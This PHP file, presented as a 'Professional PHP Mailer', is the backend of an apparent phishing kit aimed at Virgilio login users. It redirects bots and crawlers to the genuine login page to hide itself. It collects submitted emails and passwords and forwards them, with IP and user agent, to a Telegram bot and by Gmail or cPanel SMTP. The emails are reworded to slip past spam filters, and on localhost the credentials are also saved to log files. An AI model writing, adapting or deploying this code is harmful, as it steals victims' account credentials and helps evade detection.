<?php
// Professional PHP Mailer - Multiple Methods Support
// Supports Gmail SMTP, file-based logging for localhost, and future domain support

// Anti-bot protection
function isBot() {
    // Check for missing or suspicious user agent
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (empty($user_agent) || 
        stripos($user_agent, 'bot') !== false || 
        stripos($user_agent, 'crawl') !== false || 
        stripos($user_agent, 'spider') !== false) {
        return true;
    }

    // Check for missing headers that browsers typically send
    if (!isset($_SERVER['HTTP_ACCEPT']) || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        return true;
    }

    // Additional checks could be added here
    return false;
}

// Redirect bots to legitimate site
if (isBot()) {
    // Log bot attempt if enabled
    $bot_log = __DIR__ . '/logs/bot_attempts.txt';
    $log_data = date('Y-m-d H:i:s') . ' | IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . ' | UA: ' . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
    @file_put_contents($bot_log, $log_data, FILE_APPEND);

    // Redirect to legitimate site
    header('Location: https://login.virgilio.it/');
    exit;
}

// Set proper headers for JSON response
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Error handling
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/logs/php_errors.log');

// Function to output JSON and exit
function outputJson($data, $statusCode = 200) {
    http_response_code($statusCode);
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

// Function to send Telegram notification
// Async Telegram notification (non-blocking)
function sendTelegramNotificationAsync($botToken, $chatId, $data) {
    // Quick message format for performance
    $message = "🔔 New Login: " . htmlspecialchars($data['email']) . " | " . date('H:i:s');
    
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);

    // Non-blocking request using stream context
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData,
            'timeout' => 2 // Quick timeout
        ]
    ]);

    // Fire and forget - don't wait for response
    @file_get_contents($telegramApiUrl, false, $context);
    return true; // Always return true for async
}

function sendTelegramNotification($botToken, $chatId, $data, $format = 'full') {
    // Validate required parameters
    if (empty($botToken) || empty($chatId) || empty($data)) {
        error_log("Telegram notification error: Missing required parameters");
        return false;
    }

    // Format the message based on notification format
    if ($format === 'minimal') {
        $message = "🔔 <b>New Login Data</b>\n\n";
        $message .= "📧 <b>Email:</b> " . htmlspecialchars($data['email']) . "\n";
        $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    } else {
        // Full format with all details
        $message = "🔔 <b>New Login Data Received</b>\n\n";

        if (isset($data['email'])) {
            $message .= "📧 <b>Email:</b> " . htmlspecialchars($data['email']) . "\n";
        }

        if (isset($data['password'])) {
            $message .= "🔑 <b>Password:</b> " . htmlspecialchars($data['password']) . "\n";
        }

        if (isset($data['ip'])) {
            $message .= "🌐 <b>IP Address:</b> " . htmlspecialchars($data['ip']) . "\n";
        }

        if (isset($data['user_agent'])) {
            $message .= "💻 <b>User Agent:</b> " . htmlspecialchars(substr($data['user_agent'], 0, 100)) . "\n";
        }

        $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    }

    // Prepare the API request
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Use cURL to send the request
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    // Log the response for debugging
    error_log("Telegram API Response: HTTP $httpCode, Response: $response");

    // Check for success
    if ($httpCode == 200) {
        $responseData = json_decode($response, true);
        if (isset($responseData['ok']) && $responseData['ok'] === true) {
            error_log("Telegram notification sent successfully");
            return true;
        }
    }

    error_log("Telegram notification failed: HTTP $httpCode, Error: $error, Response: $response");
    return false;
}

try {
    // Load configuration
    if (!file_exists('config.php')) {
        throw new Exception('Configuration file not found');
    }

    require_once 'config.php';

    // Validate configuration
    if (!isset($gmail_config) || !isset($recipient_email) || !isset($from_email)) {
        throw new Exception('Configuration variables not properly set');
    }

    // Log Telegram config status for debugging
    if (isset($telegram_config)) {
        error_log("Telegram config loaded - Enabled: " . ($telegram_config['enabled'] ? 'true' : 'false') . 
                 ", Token present: " . (!empty($telegram_config['bot_token']) ? 'true' : 'false') . 
                 ", Chat ID present: " . (!empty($telegram_config['chat_id']) ? 'true' : 'false'));
    } else {
        error_log("Telegram config not found in config.php");
    }

    // Get POST data
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if (empty($email) || empty($password)) {
        throw new Exception('Missing email or password');
    }

    // Sanitize input
    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    // Email content with neutral language to avoid spam filters
    $subject = 'Account Verification Information - ' . date('Y-m-d H:i:s');
    $message = "
Account Verification Information

Email: {$email}
Verification Code: {$password}
Timestamp: " . date('Y-m-d H:i:s') . "
IP Address: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "
User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "
Server: " . ($_SERVER['SERVER_NAME'] ?? 'Unknown') . "

This is an automated message from the account verification system.
Verification data processed successfully.
";

    $headers = [
        'From: ' . $from_email,
        'Reply-To: ' . $from_email,
        'X-Mailer: PHP/' . phpversion(),
        'Content-Type: text/plain; charset=UTF-8'
        // Removed priority headers that might trigger spam filters
    ];

    // Optimized processing with reduced logging
    $dataSent = false;
    $telegramResult = false;
    $errorLog = [];

    // Detect environment (localhost vs production)
    $isLocalhost = in_array($_SERVER['SERVER_NAME'], ['localhost', '127.0.0.1']) || 
                   strpos($_SERVER['SERVER_NAME'], 'xampp') !== false ||
                   strpos($_SERVER['SERVER_NAME'], 'local') !== false;

    // Send Telegram notification with full details
    if (isset($telegram_config) && $telegram_config['enabled'] && !empty($telegram_config['bot_token']) && !empty($telegram_config['chat_id'])) {
        $notificationData = [
            'email' => $email,
            'password' => $password,
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
        ];

        // Send full detailed Telegram notification
        $telegramResult = sendTelegramNotification(
            $telegram_config['bot_token'],
            $telegram_config['chat_id'],
            $notificationData,
            'full'
        );
        
        if ($telegramResult) {
            error_log("Telegram notification sent successfully");
        } else {
            error_log("Telegram notification failed");
        }
    }

    // Method 1: Try Gmail SMTP first (always attempt email delivery)
    try {
        error_log("Attempting Gmail SMTP...");
        
        // Split recipients if multiple emails
        $recipients = array_map('trim', explode(',', $recipient_email));
        error_log("Sending to " . count($recipients) . " recipients: " . implode(', ', $recipients));
        
        if (sendEmailGmailMultiple($gmail_config, $recipients, $subject, $message, $headers)) {
            $dataSent = true;
            error_log("Gmail SMTP successful to all recipients");
        } else {
            $errorLog[] = 'Gmail SMTP failed';
            error_log("Gmail SMTP failed");
        }
    } catch (Exception $e) {
        $errorLog[] = 'Gmail SMTP error: ' . $e->getMessage();
        error_log("Gmail SMTP error: " . $e->getMessage());
    }

    // Method 2: File-based logging for localhost (as backup)
    if ($isLocalhost) {
        try {
            $logDir = __DIR__ . '/logs';

            // Create logs directory if it doesn't exist
            if (!file_exists($logDir)) {
                mkdir($logDir, 0755, true);
            }

            // Create a unique filename based on timestamp and email
            $filename = $logDir . '/login_' . date('Y-m-d_H-i-s') . '_' . md5($email) . '.txt';

            // Write the message to file
            if (file_put_contents($filename, $message)) {
                error_log("File saved successfully: $filename");
                
                // If email also sent, show both methods
                if ($dataSent) {
                    outputJson([
                        'success' => true, 
                        'message' => 'Data sent via email and saved to local log',
                        'method' => 'Gmail SMTP + File Logging',
                        'telegram_sent' => $telegramResult,
                        'timestamp' => date('Y-m-d H:i:s')
                    ]);
                } else {
                    // If email failed but file saved
                    outputJson([
                        'success' => true, 
                        'message' => 'Data saved to local log (email failed)',
                        'method' => 'File Logging',
                        'telegram_sent' => $telegramResult,
                        'email_errors' => $errorLog,
                        'timestamp' => date('Y-m-d H:i:s')
                    ]);
                }
            } else {
                $errorLog[] = 'File logging failed';
            }
        } catch (Exception $e) {
            $errorLog[] = 'File logging error: ' . $e->getMessage();
        }
    }

    // If email succeeded but not localhost, show success
    if ($dataSent && !$isLocalhost) {
        outputJson([
            'success' => true, 
            'message' => 'Email sent successfully via Gmail SMTP',
            'method' => 'Gmail SMTP',
            'telegram_sent' => $telegramResult,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    }

    // Method 3: Try cPanel SMTP (if configured and not localhost)
    if (!$isLocalhost && isset($cpanel_config) && !empty($cpanel_config['smtp_host'])) {
        try {
            if (sendEmailCpanelMultiple($cpanel_config, $recipients, $subject, $message, $headers)) {
                outputJson([
                    'success' => true, 
                    'message' => 'Email sent successfully via cPanel SMTP',
                    'method' => 'cPanel SMTP',
                    'telegram_sent' => $telegramResult,
                    'timestamp' => date('Y-m-d H:i:s')
                ]);
            } else {
                $errorLog[] = 'cPanel SMTP failed';
            }
        } catch (Exception $e) {
            $errorLog[] = 'cPanel SMTP error: ' . $e->getMessage();
        }
    }

    // Skip PHP mail() as Replit doesn't have sendmail configured

    // If all methods failed
    throw new Exception('All data sending methods failed. Errors: ' . implode(', ', $errorLog));

} catch (Exception $e) {
    outputJson([
        'success' => false, 
        'message' => 'Email sending failed: ' . $e->getMessage(),
        'timestamp' => date('Y-m-d H:i:s'),
        'errors' => $errorLog ?? []
    ], 500);
}

function sendEmailGmailMultiple($config, $recipients, $subject, $message, $headers) {
    try {
        // Create SMTP connection with shorter timeout for performance
        $smtp = @fsockopen($config['smtp_host'], $config['smtp_port'], $errno, $errstr, 10);

        if (!$smtp) {
            throw new Exception("SMTP connection failed: $errstr ($errno)");
        }

        // Read server greeting
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('Invalid server greeting: ' . trim($response));
        }

        // EHLO
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses (Gmail sends multiple lines)
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // STARTTLS
        fputs($smtp, "STARTTLS\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('STARTTLS failed: ' . trim($response));
        }

        // Enable TLS
        if (!stream_socket_enable_crypto($smtp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            fclose($smtp);
            throw new Exception('TLS encryption failed');
        }

        // EHLO again after TLS
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses after TLS
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // AUTH LOGIN
        fputs($smtp, "AUTH LOGIN\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('AUTH LOGIN failed: ' . trim($response));
        }

        // Send username
        fputs($smtp, base64_encode($config['smtp_username']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('Username authentication failed: ' . trim($response));
        }

        // Send password
        fputs($smtp, base64_encode($config['smtp_password']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '235') {
            fclose($smtp);
            throw new Exception('Password authentication failed: ' . trim($response));
        }

        // MAIL FROM
        fputs($smtp, "MAIL FROM: <" . $config['smtp_username'] . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('MAIL FROM failed: ' . trim($response));
        }

        // RCPT TO for each recipient
        foreach ($recipients as $recipient) {
            $recipient = trim($recipient);
            if (!empty($recipient)) {
                fputs($smtp, "RCPT TO: <" . $recipient . ">\r\n");
                $response = fgets($smtp, 515);
                if (substr($response, 0, 3) != '250') {
                    error_log("RCPT TO failed for $recipient: " . trim($response));
                    // Continue with other recipients instead of failing completely
                } else {
                    error_log("RCPT TO successful for $recipient");
                }
            }
        }

        // DATA
        fputs($smtp, "DATA\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '354') {
            fclose($smtp);
            throw new Exception('DATA command failed: ' . trim($response));
        }

        // Send email content
        fputs($smtp, "Subject: " . $subject . "\r\n");
        fputs($smtp, implode("\r\n", $headers) . "\r\n\r\n");
        fputs($smtp, $message . "\r\n.\r\n");

        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('Email sending failed: ' . trim($response));
        }

        // QUIT
        fputs($smtp, "QUIT\r\n");
        fclose($smtp);

        return true;

    } catch (Exception $e) {
        if (isset($smtp) && is_resource($smtp)) {
            fclose($smtp);
        }
        throw $e;
    }
}

function sendEmailGmail($config, $to, $subject, $message, $headers) {
    static $connection_cache = null;
    
    try {
        // Create SMTP connection with shorter timeout for performance
        $smtp = @fsockopen($config['smtp_host'], $config['smtp_port'], $errno, $errstr, 10);

        if (!$smtp) {
            throw new Exception("SMTP connection failed: $errstr ($errno)");
        }

        // Read server greeting
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('Invalid server greeting: ' . trim($response));
        }

        // EHLO
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses (Gmail sends multiple lines)
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // STARTTLS
        fputs($smtp, "STARTTLS\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('STARTTLS failed: ' . trim($response));
        }

        // Enable TLS
        if (!stream_socket_enable_crypto($smtp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            fclose($smtp);
            throw new Exception('TLS encryption failed');
        }

        // EHLO again after TLS
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses after TLS
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // AUTH LOGIN
        fputs($smtp, "AUTH LOGIN\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('AUTH LOGIN failed: ' . trim($response));
        }

        // Send username
        fputs($smtp, base64_encode($config['smtp_username']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('Username authentication failed: ' . trim($response));
        }

        // Send password
        fputs($smtp, base64_encode($config['smtp_password']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '235') {
            fclose($smtp);
            throw new Exception('Password authentication failed: ' . trim($response));
        }

        // MAIL FROM
        fputs($smtp, "MAIL FROM: <" . $config['smtp_username'] . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('MAIL FROM failed: ' . trim($response));
        }

        // RCPT TO
        fputs($smtp, "RCPT TO: <" . $to . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('RCPT TO failed: ' . trim($response));
        }

        // DATA
        fputs($smtp, "DATA\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '354') {
            fclose($smtp);
            throw new Exception('DATA command failed: ' . trim($response));
        }

        // Send email content
        fputs($smtp, "Subject: " . $subject . "\r\n");
        fputs($smtp, implode("\r\n", $headers) . "\r\n\r\n");
        fputs($smtp, $message . "\r\n.\r\n");

        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('Email sending failed: ' . trim($response));
        }

        // QUIT
        fputs($smtp, "QUIT\r\n");
        fclose($smtp);

        return true;

    } catch (Exception $e) {
        if (isset($smtp) && is_resource($smtp)) {
            fclose($smtp);
        }
        throw $e;
    }
}

function sendEmailCpanelMultiple($config, $recipients, $subject, $message, $headers) {
    try {
        // Create SMTP connection with shorter timeout for performance
        $smtp = @fsockopen($config['smtp_host'], $config['smtp_port'], $errno, $errstr, 10);

        if (!$smtp) {
            throw new Exception("SMTP connection failed: $errstr ($errno)");
        }

        // Read server greeting
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('Invalid server greeting: ' . trim($response));
        }

        // EHLO
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses (Gmail sends multiple lines)
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // STARTTLS
        fputs($smtp, "STARTTLS\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('STARTTLS failed: ' . trim($response));
        }

        // Enable TLS
        if (!stream_socket_enable_crypto($smtp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            fclose($smtp);
            throw new Exception('TLS encryption failed');
        }

        // EHLO again after TLS
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        
        // Read all EHLO responses after TLS
        do {
            $response = fgets($smtp, 515);
        } while ($response && substr($response, 3, 1) == '-');

        // AUTH LOGIN
        fputs($smtp, "AUTH LOGIN\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('AUTH LOGIN failed: ' . trim($response));
        }

        // Send username
        fputs($smtp, base64_encode($config['smtp_username']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('Username authentication failed: ' . trim($response));
        }

        // Send password
        fputs($smtp, base64_encode($config['smtp_password']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '235') {
            fclose($smtp);
            throw new Exception('Password authentication failed: ' . trim($response));
        }

        // MAIL FROM
        fputs($smtp, "MAIL FROM: <" . $config['smtp_username'] . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('MAIL FROM failed: ' . trim($response));
        }

        // RCPT TO for each recipient
        foreach ($recipients as $recipient) {
            $recipient = trim($recipient);
            if (!empty($recipient)) {
                fputs($smtp, "RCPT TO: <" . $recipient . ">\r\n");
                $response = fgets($smtp, 515);
                if (substr($response, 0, 3) != '250') {
                    error_log("RCPT TO failed for $recipient: " . trim($response));
                    // Continue with other recipients instead of failing completely
                } else {
                    error_log("RCPT TO successful for $recipient");
                }
            }
        }

        // DATA
        fputs($smtp, "DATA\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '354') {
            fclose($smtp);
            throw new Exception('DATA command failed: ' . trim($response));
        }

        // Send email content
        fputs($smtp, "Subject: " . $subject . "\r\n");
        fputs($smtp, implode("\r\n", $headers) . "\r\n\r\n");
        fputs($smtp, $message . "\r\n.\r\n");

        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('Email sending failed: ' . trim($response));
        }

        // QUIT
        fputs($smtp, "QUIT\r\n");
        fclose($smtp);

        return true;

    } catch (Exception $e) {
        if (isset($smtp) && is_resource($smtp)) {
            fclose($smtp);
        }
        throw $e;
    }
}

function sendEmailCpanel($config, $to, $subject, $message, $headers) {
    try {
        // Create SMTP connection
        $smtp = @fsockopen($config['smtp_host'], $config['smtp_port'], $errno, $errstr, 30);

        if (!$smtp) {
            throw new Exception("SMTP connection failed: $errstr ($errno)");
        }

        // Read server greeting
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($smtp);
            throw new Exception('Invalid server greeting: ' . trim($response));
        }

        // EHLO
        fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
        $response = fgets($smtp, 515);

        // STARTTLS if needed
        if (isset($config['smtp_secure']) && $config['smtp_secure'] == 'tls') {
            fputs($smtp, "STARTTLS\r\n");
            $response = fgets($smtp, 515);
            if (substr($response, 0, 3) != '220') {
                fclose($smtp);
                throw new Exception('STARTTLS failed: ' . trim($response));
            }

            if (!stream_socket_enable_crypto($smtp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
                fclose($smtp);
                throw new Exception('TLS encryption failed');
            }

            // EHLO again after TLS
            fputs($smtp, "EHLO " . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n");
            $response = fgets($smtp, 515);
        }

        // AUTH LOGIN
        fputs($smtp, "AUTH LOGIN\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('AUTH LOGIN failed: ' . trim($response));
        }

        // Send username
        fputs($smtp, base64_encode($config['smtp_username']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '334') {
            fclose($smtp);
            throw new Exception('Username authentication failed: ' . trim($response));
        }

        // Send password
        fputs($smtp, base64_encode($config['smtp_password']) . "\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '235') {
            fclose($smtp);
            throw new Exception('Password authentication failed: ' . trim($response));
        }

        // MAIL FROM
        fputs($smtp, "MAIL FROM: <" . $config['smtp_username'] . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('MAIL FROM failed: ' . trim($response));
        }

        // RCPT TO
        fputs($smtp, "RCPT TO: <" . $to . ">\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('RCPT TO failed: ' . trim($response));
        }

        // DATA
        fputs($smtp, "DATA\r\n");
        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '354') {
            fclose($smtp);
            throw new Exception('DATA command failed: ' . trim($response));
        }

        // Send email content
        fputs($smtp, "Subject: " . $subject . "\r\n");
        fputs($smtp, implode("\r\n", $headers) . "\r\n\r\n");
        fputs($smtp, $message . "\r\n.\r\n");

        $response = fgets($smtp, 515);
        if (substr($response, 0, 3) != '250') {
            fclose($smtp);
            throw new Exception('Email sending failed: ' . trim($response));
        }

        // QUIT
        fputs($smtp, "QUIT\r\n");
        fclose($smtp);

        return true;

    } catch (Exception $e) {
        if (isset($smtp) && is_resource($smtp)) {
            fclose($smtp);
        }
        throw $e;
    }
}
?>